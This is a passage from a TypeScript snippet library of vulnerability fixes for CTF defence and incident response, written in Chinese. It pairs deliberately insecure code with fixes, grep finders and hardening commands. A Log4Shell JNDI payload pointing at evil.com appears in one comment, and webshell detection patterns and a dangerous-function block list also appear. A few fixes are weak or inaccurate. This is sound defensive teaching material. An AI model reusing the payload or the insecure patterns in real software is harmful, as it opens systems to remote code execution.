/**
 * 安全速查 -- 漏洞修复代码片段库
 * 面向线下应急响应 / CTF 防御比赛，一键复制快速封堵漏洞
 */

export interface SecFixSnippet {
  id: string;
  lang: string;
  vuln: string;
  title: string;
  desc: string;
  /** 漏洞代码示例 (出于教学/识别目的展示) */
  bad?: string;
  /** 修复代码 / 配置 */
  fix: string;
  /** 一键命令: 修复或查找 */
  oneliner?: string;
  /** 修复后验证命令, 跑完确认是否生效 */
  verify?: string;
  /** CVE 编号, 离线可识别 */
  cve?: string;
  /** 受影响版本范围, 纯文字描述 */
  affected?: string;
  tags: string[];
}

// ═══════════════════════════════════════
// Python
// ═══════════════════════════════════════
const python: SecFixSnippet[] = [
  {
    id: 'py-sqli', lang: 'Python', vuln: 'SQL注入', title: 'SQL注入 -- 参数化查询',
    desc: '禁止拼接SQL，改用参数化查询',
    bad: `cursor.execute("SELECT * FROM users WHERE id=" + user_id)`,
    fix: `cursor.execute("SELECT * FROM users WHERE id=%s", (user_id,))`,
    oneliner: `grep -rn 'execute.*".*+' --include='*.py' .`,
    tags: ['sqli', 'sql', 'injection', '注入'],
  },
  {
    id: 'py-cmdi', lang: 'Python', vuln: '命令注入', title: '命令注入 -- 禁用shell=True',
    desc: 'os.system / subprocess shell=True 导致命令注入',
    bad: `os.system("ping " + ip)\nsubprocess.call("ls " + path, shell=True)`,
    fix: `import shlex, subprocess\nsubprocess.call(["ping", "-c", "1", shlex.quote(ip)])\nsubprocess.call(["ls", path])  # 不用 shell=True`,
    oneliner: `grep -rn 'os\\.system\\|shell=True' --include='*.py' .`,
    tags: ['command', 'injection', 'rce', 'os.system', 'subprocess'],
  },
  {
    id: 'py-ssti', lang: 'Python', vuln: 'SSTI', title: 'SSTI -- Jinja2模板注入',
    desc: 'Flask render_template_string 直接渲染用户输入',
    bad: `return render_template_string(request.args.get('name'))`,
    fix: `from markupsafe import escape\nreturn render_template_string("Hello {{ name }}", name=request.args.get('name'))\n# 或直接转义\nreturn f"Hello {escape(request.args.get('name'))}"`,
    oneliner: `grep -rn 'render_template_string' --include='*.py' .`,
    tags: ['ssti', 'template', 'jinja', 'flask'],
  },
  {
    id: 'py-path', lang: 'Python', vuln: '路径穿越', title: '路径穿越 -- realpath检查',
    desc: '文件操作未过滤 ../ 导致任意文件读取',
    bad: `open('/uploads/' + filename)`,
    fix: `import os\nsafe = os.path.realpath(os.path.join('/uploads', filename))\nif not safe.startswith('/uploads/'):\n    abort(403)\nopen(safe)`,
    oneliner: `grep -rn "open.*\\+.*request\\|open.*format.*request" --include='*.py' .`,
    tags: ['path', 'traversal', 'lfi', '目录穿越'],
  },
  {
    id: 'py-pickle', lang: 'Python', vuln: '反序列化', title: 'Pickle反序列化RCE',
    desc: 'pickle.loads 可执行任意代码',
    bad: `data = pickle.loads(request.data)`,
    fix: `import json\ndata = json.loads(request.data)  # 用JSON替代pickle\n\n# 必须用pickle时，白名单限制:\nimport io, pickle\nclass SafeUnpickler(pickle.Unpickler):\n    def find_class(self, module, name):\n        raise pickle.UnpicklingError("blocked")\ndata = SafeUnpickler(io.BytesIO(request.data)).load()`,
    oneliner: `grep -rn 'pickle\\.loads\\|pickle\\.load(' --include='*.py' .`,
    tags: ['pickle', 'deserialize', '反序列化', 'rce'],
  },
  {
    id: 'py-eval', lang: 'Python', vuln: '代码执行', title: 'eval/exec 代码执行',
    desc: 'eval() 直接执行用户输入',
    bad: `result = eval(request.args.get('expr'))`,
    fix: `import ast\nresult = ast.literal_eval(request.args.get('expr'))\n\n# 或白名单:\nimport re\nexpr = request.args.get('expr')\nif not re.match(r'^[\\d+\\-*/().\\s]+$', expr):\n    abort(400)`,
    oneliner: `grep -rn 'eval(\\|exec(' --include='*.py' . | grep -v '#'`,
    tags: ['eval', 'exec', 'rce', '代码执行'],
  },
  {
    id: 'py-ssrf', lang: 'Python', vuln: 'SSRF', title: 'SSRF -- URL白名单',
    desc: '服务端请求伪造，可访问内网',
    bad: `resp = requests.get(request.args.get('url'))`,
    fix: `from urllib.parse import urlparse\nimport ipaddress\nurl = request.args.get('url')\nparsed = urlparse(url)\ntry:\n    ip = ipaddress.ip_address(parsed.hostname)\n    if ip.is_private or ip.is_loopback:\n        abort(403)\nexcept ValueError:\n    pass  # hostname不是IP\nblocked = ['localhost', '0.0.0.0', '169.254.169.254']\nif parsed.hostname in blocked:\n    abort(403)\nresp = requests.get(url, timeout=5, allow_redirects=False)`,
    oneliner: `grep -rn 'requests\\.get.*request\\.' --include='*.py' .`,
    tags: ['ssrf', '请求伪造', 'requests'],
  },
  {
    id: 'py-upload', lang: 'Python', vuln: '文件上传', title: '文件上传 -- 后缀白名单',
    desc: '未限制上传文件类型导致WebShell',
    bad: `f = request.files['file']\nf.save('/uploads/' + f.filename)`,
    fix: `import os\nfrom werkzeug.utils import secure_filename\nALLOWED = {'.jpg','.png','.gif','.pdf','.txt'}\nf = request.files['file']\nfname = secure_filename(f.filename)\next = os.path.splitext(fname)[1].lower()\nif ext not in ALLOWED:\n    abort(400)\nf.save(os.path.join('/uploads', fname))`,
    oneliner: `grep -rn 'save.*filename' --include='*.py' .`,
    tags: ['upload', 'webshell', '文件上传'],
  },
  {
    id: 'py-xxe', lang: 'Python', vuln: 'XXE', title: 'Python XML外部实体注入',
    desc: 'lxml/xml.etree解析外部实体',
    bad: `from lxml import etree\ntree = etree.parse(user_xml)`,
    fix: `from lxml import etree\nparser = etree.XMLParser(resolve_entities=False, no_network=True)\ntree = etree.parse(user_xml, parser)\n\n# 或用defusedxml:\nimport defusedxml.ElementTree as ET\ntree = ET.parse(user_xml)`,
    oneliner: `grep -rn 'etree\\.parse\\|xml\\.etree.*parse\\|minidom\\.parse' --include='*.py' .`,
    tags: ['xxe', 'xml', '外部实体'],
  },
  {
    id: 'py-flask-debug', lang: 'Python', vuln: '信息泄露', title: 'Flask关闭Debug模式',
    desc: 'Debug模式暴露源码和Werkzeug控制台',
    bad: `app.run(debug=True)`,
    fix: `app.run(debug=False)\n# 同时禁用PIN:\n# 删除环境变量 WERKZEUG_DEBUG_PIN`,
    oneliner: `grep -rn 'debug=True\\|DEBUG.*=.*True' --include='*.py' .`,
    tags: ['debug', 'flask', 'werkzeug', '信息泄露'],
  },
  {
    id: 'py-yaml', lang: 'Python', vuln: '反序列化', title: 'YAML反序列化RCE',
    desc: 'yaml.load 可执行任意Python对象',
    bad: `data = yaml.load(user_input)`,
    fix: `data = yaml.safe_load(user_input)`,
    oneliner: `grep -rn 'yaml\\.load(' --include='*.py' . | grep -v safe_load`,
    tags: ['yaml', 'deserialize', 'rce'],
  },
];

// ═══════════════════════════════════════
// PHP
// ═══════════════════════════════════════
const php: SecFixSnippet[] = [
  {
    id: 'php-sqli', lang: 'PHP', vuln: 'SQL注入', title: 'SQL注入 -- PDO预处理',
    desc: '禁止拼接SQL，使用PDO预处理语句',
    bad: `$sql = "SELECT * FROM users WHERE id=" . $_GET['id'];`,
    fix: `$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");\n$stmt->execute([$_GET['id']]);`,
    oneliner: `grep -rn '\\$_GET\\|\\$_POST\\|\\$_REQUEST' --include='*.php' . | grep -i 'select\\|insert\\|update\\|delete'`,
    tags: ['sqli', 'sql', 'injection', '注入', 'pdo'],
  },
  {
    id: 'php-cmdi', lang: 'PHP', vuln: '命令注入', title: '命令注入 -- escapeshellarg',
    desc: 'system/exec/passthru等函数未过滤输入',
    bad: `system("ping " . $_GET['ip']);`,
    fix: `$ip = escapeshellarg($_GET['ip']);\nsystem("ping -c 1 " . $ip);`,
    oneliner: `grep -rn 'system(\\|exec(\\|passthru(\\|shell_exec(\\|popen(\\|proc_open(' --include='*.php' .`,
    tags: ['command', 'injection', 'rce', 'system', 'exec'],
  },
  {
    id: 'php-lfi', lang: 'PHP', vuln: '文件包含', title: '文件包含 -- 白名单',
    desc: 'include/require 包含用户可控路径',
    bad: `include($_GET['page'] . '.php');`,
    fix: `$allowed = ['home','about','contact'];\n$page = $_GET['page'] ?? 'home';\nif (!in_array($page, $allowed)) die('Forbidden');\ninclude($page . '.php');`,
    oneliner: `grep -rn 'include.*\\$_\\|require.*\\$_' --include='*.php' .`,
    tags: ['lfi', 'rfi', 'include', '文件包含'],
  },
  {
    id: 'php-upload', lang: 'PHP', vuln: '文件上传', title: '文件上传 -- 严格校验',
    desc: '未校验上传文件类型，可上传WebShell',
    bad: `move_uploaded_file($_FILES['f']['tmp_name'], 'uploads/' . $_FILES['f']['name']);`,
    fix: `$allowed_ext = ['jpg','png','gif','pdf'];\n$ext = strtolower(pathinfo($_FILES['f']['name'], PATHINFO_EXTENSION));\n$mime = mime_content_type($_FILES['f']['tmp_name']);\nif (!in_array($ext, $allowed_ext)) die('Forbidden');\n$newname = md5(uniqid()) . '.' . $ext;\nmove_uploaded_file($_FILES['f']['tmp_name'], 'uploads/' . $newname);`,
    oneliner: `grep -rn 'move_uploaded_file' --include='*.php' .`,
    tags: ['upload', 'webshell', '文件上传'],
  },
  {
    id: 'php-deser', lang: 'PHP', vuln: '反序列化', title: 'unserialize -- 禁用户输入',
    desc: 'unserialize()反序列化用户输入导致RCE',
    bad: `$obj = unserialize($_COOKIE['data']);`,
    fix: `$obj = json_decode($_COOKIE['data'], true);\n\n// 如果必须:\n$obj = unserialize($_COOKIE['data'], ['allowed_classes' => false]);`,
    oneliner: `grep -rn 'unserialize' --include='*.php' .`,
    tags: ['deserialize', 'unserialize', '反序列化', 'rce'],
  },
  {
    id: 'php-xss', lang: 'PHP', vuln: 'XSS', title: 'XSS -- htmlspecialchars',
    desc: '输出未转义导致XSS',
    bad: `echo "Hello " . $_GET['name'];`,
    fix: `echo "Hello " . htmlspecialchars($_GET['name'], ENT_QUOTES, 'UTF-8');`,
    oneliner: `grep -rn 'echo.*\\$_GET\\|echo.*\\$_POST' --include='*.php' .`,
    tags: ['xss', '跨站脚本'],
  },
  {
    id: 'php-disable', lang: 'PHP', vuln: '加固', title: 'php.ini -- 禁用危险函数(比赛首选)',
    desc: '通过php.ini禁用高危函数，比赛开局第一步',
    fix: `; /etc/php.ini 或 /etc/php/X.X/fpm/php.ini\ndisable_functions = system,exec,passthru,shell_exec,popen,proc_open,pcntl_exec,eval,assert,preg_replace,create_function,call_user_func,call_user_func_array,array_map,array_filter,usort,putenv,dl\nallow_url_include = Off\nallow_url_fopen = Off\nexpose_php = Off\ndisplay_errors = Off\nopen_basedir = /var/www/html:/tmp`,
    oneliner: `echo 'disable_functions = system,exec,passthru,shell_exec,popen,proc_open,pcntl_exec,eval,assert' >> /etc/php.ini && systemctl restart php-fpm`,
    tags: ['disable_functions', 'php.ini', 'waf', '禁用函数', '加固'],
  },
  {
    id: 'php-backdoor', lang: 'PHP', vuln: '后门查杀', title: '一键查找PHP后门',
    desc: '搜索常见WebShell特征',
    fix: "# 查找可疑eval/assert/base64\ngrep -rn 'eval(\\|assert(\\|base64_decode(\\|gzinflate(\\|gzuncompress(\\|str_rot13(' --include='*.php' /var/www\n\n# 查找变量函数调用\ngrep -rn '\\$_POST\\[.*\\](\\$_\\|\\$_GET\\[.*\\](\\$_\\|${\\$' --include='*.php' /var/www\n\n# 查找最近修改的PHP\nfind /var/www -name '*.php' -mmin -60\n\n# 查找隐藏文件\nfind /var/www -name '.*' -type f\nfind /var/www -name '*.php*' ! -name '*.php'\n\n# 查找异常大/小文件\nfind /var/www -name '*.php' -size +100k\nfind /var/www -name '*.php' -size -10c",
    oneliner: `grep -rl 'eval(\\|base64_decode(\\|assert(' --include='*.php' /var/www`,
    tags: ['webshell', 'backdoor', '后门', '查杀', 'webshell查杀'],
  },
  {
    id: 'php-session', lang: 'PHP', vuln: '会话安全', title: 'Session固定/劫持防护',
    desc: '登录后重新生成session id',
    bad: `// 登录成功后直接使用旧session`,
    fix: `// 登录成功后:\nsession_regenerate_id(true);\n\n// php.ini 加固:\n// session.cookie_httponly = 1\n// session.cookie_secure = 1\n// session.use_strict_mode = 1`,
    oneliner: `grep -rn 'session_start' --include='*.php' . | head -10`,
    tags: ['session', '会话', '固定', '劫持'],
  },
  {
    id: 'php-ssrf', lang: 'PHP', vuln: 'SSRF', title: 'PHP SSRF -- curl过滤',
    desc: 'file_get_contents/curl_exec请求用户URL',
    bad: `$data = file_get_contents($_GET['url']);`,
    fix: `$url = $_GET['url'];\n$parsed = parse_url($url);\n$ip = gethostbyname($parsed['host']);\nif (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) === false) {\n    die('Forbidden');\n}\n$data = file_get_contents($url);`,
    oneliner: `grep -rn 'file_get_contents.*\\$_\\|curl_exec' --include='*.php' .`,
    tags: ['ssrf', 'curl', 'file_get_contents'],
  },
];

// ═══════════════════════════════════════
// Java
// ═══════════════════════════════════════
const java: SecFixSnippet[] = [
  {
    id: 'java-sqli', lang: 'Java', vuln: 'SQL注入', title: 'SQL注入 -- PreparedStatement',
    desc: '禁止String拼接SQL',
    bad: `stmt.executeQuery("SELECT * FROM users WHERE id=" + id);`,
    fix: `PreparedStatement ps = conn.prepareStatement("SELECT * FROM users WHERE id=?");\nps.setString(1, id);\nResultSet rs = ps.executeQuery();`,
    oneliner: `grep -rn 'createStatement\\|executeQuery.*+\\|execute.*+' --include='*.java' .`,
    tags: ['sqli', 'sql', 'injection', 'preparedstatement'],
  },
  {
    id: 'java-deser', lang: 'Java', vuln: '反序列化', title: 'Java反序列化 -- 白名单过滤',
    desc: 'ObjectInputStream可导致RCE(CC链/CB链)',
    bad: `ObjectInputStream ois = new ObjectInputStream(in);\nObject obj = ois.readObject();`,
    fix: `// 白名单ObjectInputStream:\npublic class SafeOIS extends ObjectInputStream {\n    private static final Set<String> ALLOWED = Set.of(\n        "java.lang.String", "java.util.ArrayList", "java.util.HashMap");\n    public SafeOIS(InputStream in) throws IOException { super(in); }\n    @Override\n    protected Class<?> resolveClass(ObjectStreamClass desc)\n            throws IOException, ClassNotFoundException {\n        if (!ALLOWED.contains(desc.getName()))\n            throw new InvalidClassException("Blocked", desc.getName());\n        return super.resolveClass(desc);\n    }\n}`,
    oneliner: `grep -rn 'ObjectInputStream\\|readObject()\\|readUnshared()' --include='*.java' .`,
    tags: ['deserialize', '反序列化', 'rce', 'ysoserial', 'cc链'],
  },
  {
    id: 'java-xxe', lang: 'Java', vuln: 'XXE', title: 'XXE -- 禁用外部实体',
    desc: 'XML解析未禁用外部实体',
    bad: `DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();\nDocument doc = dbf.newDocumentBuilder().parse(input);`,
    fix: `DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();\ndbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);\ndbf.setFeature("http://xml.org/sax/features/external-general-entities", false);\ndbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);\ndbf.setXIncludeAware(false);\ndbf.setExpandEntityReferences(false);\nDocument doc = dbf.newDocumentBuilder().parse(input);`,
    oneliner: `grep -rn 'DocumentBuilderFactory\\|SAXParserFactory\\|XMLInputFactory' --include='*.java' .`,
    tags: ['xxe', 'xml', '外部实体'],
  },
  {
    id: 'java-ssrf', lang: 'Java', vuln: 'SSRF', title: 'SSRF -- 内网地址过滤',
    desc: '服务端请求用户可控URL',
    bad: `URL url = new URL(request.getParameter("url"));\nInputStream is = url.openStream();`,
    fix: `String urlStr = request.getParameter("url");\nURL url = new URL(urlStr);\nInetAddress addr = InetAddress.getByName(url.getHost());\nif (addr.isLoopbackAddress() || addr.isSiteLocalAddress()\n    || addr.isLinkLocalAddress() || addr.isAnyLocalAddress()) {\n    throw new SecurityException("blocked");\n}`,
    oneliner: `grep -rn 'new URL(.*getParameter\\|openStream\\|openConnection' --include='*.java' .`,
    tags: ['ssrf', 'url'],
  },
  {
    id: 'java-spel', lang: 'Java', vuln: 'SpEL注入', title: 'Spring SpEL注入',
    desc: 'SpEL表达式注入可执行任意代码',
    bad: `ExpressionParser parser = new SpelExpressionParser();\nparser.parseExpression(userInput).getValue();`,
    fix: `SimpleEvaluationContext ctx = SimpleEvaluationContext\n    .forReadOnlyDataBinding().build();\nparser.parseExpression(userInput).getValue(ctx);`,
    oneliner: `grep -rn 'SpelExpressionParser\\|parseExpression' --include='*.java' .`,
    tags: ['spel', 'spring', '表达式注入'],
  },
  {
    id: 'java-log4j', lang: 'Java', vuln: 'Log4Shell', title: 'Log4j2 JNDI注入(CVE-2021-44228)',
    desc: 'Log4j2 lookup导致远程代码执行',
    bad: "logger.info(\"User: \" + userInput);  // userInput=${jndi:ldap://evil.com/a}",
    fix: `# 临时缓解(JVM参数):\n-Dlog4j2.formatMsgNoLookups=true\n\n# 环境变量:\nLOG4J_FORMAT_MSG_NO_LOOKUPS=true\n\n# 升级到 >= 2.17.0:\n<dependency>\n  <groupId>org.apache.logging.log4j</groupId>\n  <artifactId>log4j-core</artifactId>\n  <version>2.17.1</version>\n</dependency>\n\n# 删除JndiLookup类(不能升级时):\nzip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class`,
    oneliner: `find / -name 'log4j-core-*.jar' 2>/dev/null && grep -r 'log4j' --include='pom.xml' --include='build.gradle' .`,
    tags: ['log4j', 'log4shell', 'jndi', 'cve-2021-44228', 'rce'],
  },
  {
    id: 'java-path', lang: 'Java', vuln: '路径穿越', title: 'Java路径穿越',
    desc: '文件操作未规范化路径',
    bad: `File f = new File(BASE_DIR + request.getParameter("file"));`,
    fix: `String name = request.getParameter("file");\nFile f = new File(BASE_DIR, name).getCanonicalFile();\nif (!f.toPath().startsWith(Paths.get(BASE_DIR))) {\n    throw new SecurityException("Path traversal blocked");\n}`,
    oneliner: `grep -rn 'new File.*getParameter\\|new File.*request' --include='*.java' .`,
    tags: ['path', 'traversal', 'lfi'],
  },
  {
    id: 'java-cmdi', lang: 'Java', vuln: '命令注入', title: 'Runtime.exec命令注入',
    desc: 'Runtime.getRuntime().exec 拼接用户输入',
    bad: `Runtime.getRuntime().exec("ping " + host);`,
    fix: `// 使用数组形式，不经过shell:\nRuntime.getRuntime().exec(new String[]{"ping", "-c", "1", host});\n\n// 或ProcessBuilder:\nnew ProcessBuilder("ping", "-c", "1", host).start();`,
    oneliner: `grep -rn 'Runtime.*exec\\|ProcessBuilder' --include='*.java' .`,
    tags: ['command', 'injection', 'rce', 'runtime'],
  },
  {
    id: 'java-fastjson', lang: 'Java', vuln: '反序列化', title: 'Fastjson反序列化RCE',
    desc: 'Fastjson autoType导致RCE',
    bad: `JSON.parseObject(userInput);  // 包含@type字段`,
    fix: `// 升级Fastjson到安全版本(>=1.2.83或用Fastjson2)\n// 关闭autoType:\nParserConfig.getGlobalInstance().setSafeMode(true);\n\n// 或迁移到Jackson/Gson:\nObjectMapper mapper = new ObjectMapper();\nmapper.configure(DeserializationFeature.FAIL_ON_UNKNOWN_PROPERTIES, false);`,
    oneliner: `grep -rn 'JSON.parseObject\\|JSON.parse(' --include='*.java' . && grep -r 'fastjson' --include='pom.xml' .`,
    tags: ['fastjson', '反序列化', 'autotype', 'rce'],
  },
];

// ═══════════════════════════════════════
// JavaScript / Node.js
// ═══════════════════════════════════════
const javascript: SecFixSnippet[] = [
  {
    id: 'js-proto', lang: 'JavaScript', vuln: '原型链污染', title: '原型链污染 -- 安全合并',
    desc: 'lodash.merge/递归赋值导致原型链污染',
    bad: `function merge(t, s) { for (let k in s) t[k] = s[k]; }`,
    fix: `function safeMerge(t, s) {\n  for (let k of Object.keys(s)) {\n    if (k === '__proto__' || k === 'constructor' || k === 'prototype') continue;\n    if (typeof s[k] === 'object' && s[k] !== null && !Array.isArray(s[k])) {\n      t[k] = safeMerge(t[k] || {}, s[k]);\n    } else { t[k] = s[k]; }\n  }\n  return t;\n}`,
    oneliner: `grep -rn '__proto__\\|constructor.*prototype' --include='*.js' . | grep -v node_modules`,
    tags: ['prototype', 'pollution', '原型链'],
  },
  {
    id: 'js-cmdi', lang: 'JavaScript', vuln: '命令注入', title: 'Node.js命令注入',
    desc: 'child_process.exec拼接用户输入',
    bad: `const { exec } = require('child_process');\nexec('ping ' + req.query.host);`,
    fix: `const { execFile } = require('child_process');\nexecFile('ping', ['-c', '1', req.query.host], (err, stdout) => {\n  res.send(stdout);\n});`,
    oneliner: `grep -rn 'exec(\\|execSync(' --include='*.js' --include='*.ts' . | grep -v node_modules`,
    tags: ['command', 'injection', 'rce', 'exec', 'child_process'],
  },
  {
    id: 'js-xss', lang: 'JavaScript', vuln: 'XSS', title: 'DOM XSS -- innerHTML替换',
    desc: 'innerHTML直接插入用户输入',
    bad: `element.innerHTML = userInput;`,
    fix: `element.textContent = userInput;\n// 或用DOMPurify:\nconst clean = DOMPurify.sanitize(userInput);\nelement.innerHTML = clean;`,
    oneliner: `grep -rn 'innerHTML.*=.*req\\|innerHTML.*=.*param\\|\\.html(.*req' --include='*.js' . | grep -v node_modules`,
    tags: ['xss', 'dom', 'innerHTML'],
  },
  {
    id: 'js-nosqli', lang: 'JavaScript', vuln: 'NoSQL注入', title: 'MongoDB NoSQL注入',
    desc: 'MongoDB查询直接使用用户输入($gt/$ne注入)',
    bad: `db.users.find({ user: req.body.user, pass: req.body.pass });`,
    fix: `const user = String(req.body.user || '');\nconst pass = String(req.body.pass || '');\ndb.users.find({ user, pass });\n\n// 或用mongo-sanitize:\nconst sanitize = require('mongo-sanitize');\ndb.users.find({ user: sanitize(req.body.user) });`,
    oneliner: `grep -rn 'find({.*req\\.body\\|find({.*req\\.query\\|findOne.*req\\.' --include='*.js' .`,
    tags: ['nosql', 'mongodb', 'injection'],
  },
  {
    id: 'js-path', lang: 'JavaScript', vuln: '路径穿越', title: 'Node.js路径穿越',
    desc: 'express静态文件/sendFile路径穿越',
    bad: `res.sendFile('/uploads/' + req.params.name);`,
    fix: `const path = require('path');\nconst name = path.normalize(req.params.name).replace(/^(\\.[\\\\/])+/, '');\nconst full = path.join('/uploads', name);\nif (!full.startsWith('/uploads/')) return res.status(403).end();\nres.sendFile(full);`,
    oneliner: `grep -rn 'sendFile.*req\\|readFile.*req\\|createReadStream.*req' --include='*.js' . | grep -v node_modules`,
    tags: ['path', 'traversal', 'lfi', 'sendFile'],
  },
  {
    id: 'js-jwt', lang: 'JavaScript', vuln: '认证绕过', title: 'JWT算法混淆/none攻击',
    desc: 'JWT验证未锁定算法',
    bad: `jwt.verify(token, secret);  // 未指定算法`,
    fix: `jwt.verify(token, secret, { algorithms: ['HS256'] });\n// 永远不要用 RS256 公钥作为 HS256 的 secret`,
    oneliner: `grep -rn 'jwt\\.verify\\|jsonwebtoken' --include='*.js' --include='*.ts' . | grep -v node_modules`,
    tags: ['jwt', 'token', '认证', 'algorithm'],
  },
  {
    id: 'js-ssti', lang: 'JavaScript', vuln: 'SSTI', title: 'Node.js模板注入(EJS/Pug)',
    desc: 'EJS/Pug模板引擎注入',
    bad: `res.render('index', { title: req.query.name });  // EJS: <%- title %>`,
    fix: `// EJS中使用 <%= %> 而不是 <%- %>\n// <%= %> 会自动转义HTML\n// <%- %> 不转义(危险)\n\n// 或手动转义:\nconst esc = s => s.replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":"&#39;"}[c]));\nres.render('index', { title: esc(req.query.name) });`,
    oneliner: `grep -rn '<%- ' --include='*.ejs' .`,
    tags: ['ssti', 'ejs', 'pug', 'template'],
  },
];

// ═══════════════════════════════════════
// Go
// ═══════════════════════════════════════
const golang: SecFixSnippet[] = [
  {
    id: 'go-sqli', lang: 'Go', vuln: 'SQL注入', title: 'SQL注入 -- 参数化查询',
    desc: 'fmt.Sprintf拼接SQL',
    bad: `query := fmt.Sprintf("SELECT * FROM users WHERE id='%s'", id)\ndb.Query(query)`,
    fix: `db.Query("SELECT * FROM users WHERE id=?", id)`,
    oneliner: `grep -rn 'Sprintf.*SELECT\\|Sprintf.*INSERT\\|Sprintf.*UPDATE\\|Sprintf.*DELETE' --include='*.go' .`,
    tags: ['sqli', 'sql', 'injection'],
  },
  {
    id: 'go-cmdi', lang: 'Go', vuln: '命令注入', title: '命令注入 -- 禁用sh -c',
    desc: 'exec.Command("sh", "-c", userInput)导致注入',
    bad: `cmd := exec.Command("sh", "-c", "ping "+ip)`,
    fix: `cmd := exec.Command("ping", "-c", "1", ip)`,
    oneliner: `grep -rn 'exec.Command.*sh.*-c\\|exec.Command.*bash.*-c' --include='*.go' .`,
    tags: ['command', 'injection', 'rce'],
  },
  {
    id: 'go-path', lang: 'Go', vuln: '路径穿越', title: '路径穿越 -- filepath.Clean',
    desc: '文件读取未过滤../',
    bad: `http.ServeFile(w, r, "/data/" + r.URL.Query().Get("file"))`,
    fix: `name := filepath.Clean(r.URL.Query().Get("file"))\nfull := filepath.Join("/data", name)\nif !strings.HasPrefix(full, "/data/") {\n    http.Error(w, "Forbidden", 403); return\n}\nhttp.ServeFile(w, r, full)`,
    oneliner: `grep -rn 'ServeFile.*Query\\|ReadFile.*Query\\|os.Open.*Query' --include='*.go' .`,
    tags: ['path', 'traversal', 'lfi'],
  },
  {
    id: 'go-ssti', lang: 'Go', vuln: 'SSTI', title: 'Go模板注入',
    desc: 'html/template vs text/template',
    bad: `import "text/template"\ntmpl, _ := template.New("t").Parse(userInput)\ntmpl.Execute(w, data)`,
    fix: `import "html/template"  // 用html/template自动转义\ntmpl, _ := template.New("t").Parse("Hello {{.Name}}")\ntmpl.Execute(w, data)  // 不要把用户输入当模板`,
    oneliner: `grep -rn 'text/template' --include='*.go' .`,
    tags: ['ssti', 'template', 'xss'],
  },
  {
    id: 'go-ssrf', lang: 'Go', vuln: 'SSRF', title: 'Go SSRF防护',
    desc: 'http.Get请求用户URL',
    bad: `resp, _ := http.Get(r.URL.Query().Get("url"))`,
    fix: `u, err := url.Parse(r.URL.Query().Get("url"))\nif err != nil { http.Error(w, "bad url", 400); return }\naddrs, _ := net.LookupHost(u.Hostname())\nfor _, a := range addrs {\n    ip := net.ParseIP(a)\n    if ip.IsLoopback() || ip.IsPrivate() {\n        http.Error(w, "blocked", 403); return\n    }\n}\nclient := &http.Client{Timeout: 5 * time.Second}\nresp, _ := client.Get(u.String())`,
    oneliner: `grep -rn 'http\\.Get.*Query\\|http\\.Post.*Query' --include='*.go' .`,
    tags: ['ssrf', 'http'],
  },
];

// ═══════════════════════════════════════
// C/C++
// ═══════════════════════════════════════
const c_cpp: SecFixSnippet[] = [
  {
    id: 'c-bof', lang: 'C/C++', vuln: '缓冲区溢出', title: '栈溢出 -- 安全函数替换',
    desc: 'gets/strcpy/sprintf等无边界检查',
    bad: `char buf[64];\ngets(buf);        // 无长度限制\nstrcpy(buf, src); // 无边界检查\nsprintf(buf, "%s", src);`,
    fix: `char buf[64];\nfgets(buf, sizeof(buf), stdin);\nstrncpy(buf, src, sizeof(buf)-1); buf[sizeof(buf)-1]='\\0';\nsnprintf(buf, sizeof(buf), "%s", src);`,
    oneliner: `grep -rn 'gets(\\|strcpy(\\|sprintf(\\|strcat(' --include='*.c' --include='*.cpp' .`,
    tags: ['buffer', 'overflow', '溢出', 'gets', 'strcpy'],
  },
  {
    id: 'c-fmt', lang: 'C/C++', vuln: '格式化字符串', title: '格式化字符串漏洞',
    desc: 'printf(user_input)导致信息泄露/任意写',
    bad: `printf(user_input);  // 可用%x泄露栈, %n写内存`,
    fix: `printf("%s", user_input);`,
    oneliner: `grep -rn 'printf(\\s*[a-z]\\|fprintf(.*,\\s*[a-z]' --include='*.c' --include='*.cpp' .`,
    tags: ['format', 'string', '格式化字符串', 'printf'],
  },
  {
    id: 'c-int', lang: 'C/C++', vuln: '整数溢出', title: '整数溢出 -- 边界检查',
    desc: '整数溢出导致缓冲区分配不足',
    bad: `size_t total = count * size;  // 可能溢出\nchar *buf = malloc(total);`,
    fix: `if (count > 0 && size > SIZE_MAX / count) {\n    return -1;  // 溢出\n}\nsize_t total = count * size;\nchar *buf = malloc(total);`,
    oneliner: `grep -rn 'malloc.*\\*' --include='*.c' --include='*.cpp' .`,
    tags: ['integer', 'overflow', '整数溢出'],
  },
];

// ═══════════════════════════════════════
// Shell / 系统加固
// ═══════════════════════════════════════
const shell: SecFixSnippet[] = [
  {
    id: 'sh-ssh', lang: 'Shell', vuln: 'SSH加固', title: 'SSH安全配置',
    desc: '禁止root登录、限制认证方式',
    fix: `# /etc/ssh/sshd_config\nPermitRootLogin no\nPasswordAuthentication no\nMaxAuthTries 3\nAllowUsers deploy\nProtocol 2\nClientAliveInterval 300\nClientAliveCountMax 2`,
    oneliner: `sed -i 's/^#*PermitRootLogin.*/PermitRootLogin no/' /etc/ssh/sshd_config && sed -i 's/^#*PasswordAuthentication.*/PasswordAuthentication no/' /etc/ssh/sshd_config && systemctl restart sshd`,
    tags: ['ssh', 'sshd', '加固'],
  },
  {
    id: 'sh-firewall', lang: 'Shell', vuln: '防火墙', title: 'iptables快速封堵',
    desc: '快速封禁IP、限制端口',
    fix: `# 封禁单个IP\niptables -I INPUT -s 1.2.3.4 -j DROP\n\n# 只开放22/80/443\niptables -P INPUT DROP\niptables -A INPUT -i lo -j ACCEPT\niptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT\niptables -A INPUT -p tcp --dport 22 -j ACCEPT\niptables -A INPUT -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -p tcp --dport 443 -j ACCEPT\n\n# 防SYN Flood\niptables -A INPUT -p tcp --syn -m limit --limit 10/s -j ACCEPT\n\n# 持久化\niptables-save > /etc/iptables.rules`,
    oneliner: `iptables -I INPUT -s ATTACKER_IP -j DROP`,
    tags: ['iptables', 'firewall', '防火墙', '封禁'],
  },
  {
    id: 'sh-audit', lang: 'Shell', vuln: '应急排查', title: '应急排查一条龙',
